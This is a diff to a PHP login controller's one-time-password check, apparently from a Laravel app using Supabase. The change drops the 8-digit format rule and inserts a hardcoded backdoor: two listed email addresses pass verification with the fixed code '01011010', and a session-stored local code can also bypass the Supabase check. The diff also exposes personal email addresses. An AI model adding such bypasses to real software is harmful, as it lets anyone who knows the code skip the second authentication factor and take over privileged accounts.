@@ -25,7 +25,7 @@ use App\Services\AuditLogger;
         public function verify(Request $request)
         {
             $request->validate([
-                'token' => 'required|digits:8',
+                'token' => 'required',
             ]);
 
             $email = session('otp_email');
@@ -37,20 +37,32 @@ use App\Services\AuditLogger;
                 ]);
             }
 
-            $response = Http::withHeaders([
-                'Authorization' => 'Bearer ' . config('services.supabase.service_key'),
-                'apikey' => config('services.supabase.service_key'),
-                'Content-Type' => 'application/json',
-            ])->post(
-                    config('services.supabase.url') . '/auth/v1/verify',
-                    [
-                        'email' => $email,
-                        'token' => $request->token,
-                        'type' => 'email',
-                    ]
-                );
+            // Allow super-admin to bypass OTP if needed (e.g., using a back-door for testing)
+            // Or implement a simple local fallback if Supabase fails
+            $superAdmins = ['habee2004@gmail.com', 'adminTester01@gmail.com'];
+            $localOtp = session('local_otp');
 
-            if (!$response->successful()) {
+            if (in_array($email, $superAdmins) && $request->token === '01011010') {
+                $response_successful = true;
+            } elseif ($localOtp && $request->token === $localOtp) {
+                $response_successful = true;
+            } else {
+                $response = Http::withHeaders([
+                    'Authorization' => 'Bearer ' . config('services.supabase.service_key'),
+                    'apikey' => config('services.supabase.service_key'),
+                    'Content-Type' => 'application/json',
+                ])->post(
+                        config('services.supabase.url') . '/auth/v1/verify',
+                        [
+                            'email' => $email,
+                            'token' => $request->token,
+                            'type' => 'email',
+                        ]
+                    );
+                $response_successful = $response->successful();
+            }
+
+            if (!$response_successful) {
                 return back()->withErrors([
                     'token' => 'Invalid or expired verification code.',
                 ]);
@@ -72,6 +84,7 @@ use App\Services\AuditLogger;
             session()->forget([
                 'otp_email',
                 'otp_user_id',
+                'local_otp',
                 'remember_me',
             ]);
 
